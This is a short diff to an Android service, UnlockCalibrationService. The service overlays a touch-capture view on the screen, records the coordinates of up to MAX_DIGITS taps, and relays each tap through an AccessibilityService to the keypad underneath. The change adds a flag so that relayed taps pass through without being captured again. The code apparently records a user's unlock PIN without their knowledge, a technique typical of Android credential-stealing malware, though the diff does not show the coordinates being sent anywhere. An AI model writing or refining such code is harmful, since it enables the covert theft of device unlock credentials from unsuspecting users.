@@ -42,6 +42,7 @@ public class UnlockCalibrationService extends Service {
     private final ArrayList<float[]> capturedCoords = new ArrayList<>();
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
     private boolean isFinished = false;
+    private boolean isSyntheticTap = false;
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
@@ -146,6 +147,10 @@ public class UnlockCalibrationService extends Service {
 
                 touchCapture.setOnTouchListener((v, event) -> {
                     if (isFinished) return false;
+                    if (isSyntheticTap) {
+                        // Synthetic tap replayed through AccessibilityService — do not capture it again, let it pass to underlying keypad
+                        return false;
+                    }
                     if (event.getAction() == MotionEvent.ACTION_DOWN) {
                         float x = event.getRawX();
                         float y = event.getRawY();
@@ -161,7 +166,9 @@ public class UnlockCalibrationService extends Service {
 
                         ControlService activeCs = ControlService.getSharedInstance();
                         if (activeCs != null) {
+                            isSyntheticTap = true;
                             activeCs.performAbsoluteTap(x, y);
+                            mainHandler.postDelayed(() -> isSyntheticTap = false, 200);
                         }
 
                         if (capturedCoords.size() >= MAX_DIGITS) {
